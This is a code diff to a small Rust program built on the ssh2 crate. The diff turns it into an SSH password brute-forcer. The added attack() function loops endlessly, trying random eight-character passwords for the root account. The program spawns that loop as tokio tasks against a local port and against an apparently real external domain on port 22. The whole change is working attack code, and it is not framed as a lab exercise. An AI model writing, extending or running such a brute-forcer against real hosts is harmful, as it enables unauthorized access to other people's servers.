@@ -1,10 +1,20 @@
 use ssh2::Session;
-use std::net::TcpStream;
+use tokio::sync::RwLockMappedWriteGuard;
+use std::{net::TcpStream, thread::JoinHandle};
 use colored::Colorize;
 use std::io::Write;
 use chrono::Local;
 use env_logger::Builder;
 use log::LevelFilter;
+use rand::distr::{Alphanumeric, SampleString};
+
+fn attack(host: &str, port: u16) {
+    loop {
+        if check_ssh_login(host, port, "root", Alphanumeric.sample_string(&mut rand::rng(), 8).as_str()) == true {
+            return
+        }
+    }
+}
 
 fn check_ssh_login(host: &str, port: u16, username: &str, password: &str) -> bool {
     let tcp = TcpStream::connect((host, port)).map_err(|e| format!("TCP connection failed: {}", e));
@@ -34,7 +44,15 @@ fn check_ssh_login(host: &str, port: u16, username: &str, password: &str) -> boo
     }
 }
 
-fn main() {
+fn create_attack_handle(host: String, port: u16) -> tokio::task::JoinHandle<()> {
+    let port = port.clone();
+    return tokio::spawn(async move {
+        attack(host.as_str(), port)
+    })
+}
+
+#[tokio::main]
+async fn main() {
     Builder::new()
         .format(|buf, record| {
             writeln!(buf,
@@ -48,7 +66,10 @@ fn main() {
         .filter(None, LevelFilter::Info)
         .init();
 
-    check_ssh_login("127.0.0.1", 2222, "root", "passworda");
-    check_ssh_login("127.0.0.1", 2222, "root", "password");
+    create_attack_handle("127.0.0.1".to_string(), 2222);
+    create_attack_handle("sten-heimbrodt.de".to_string(), 22);
 
+    loop {
+        
+    }
 }
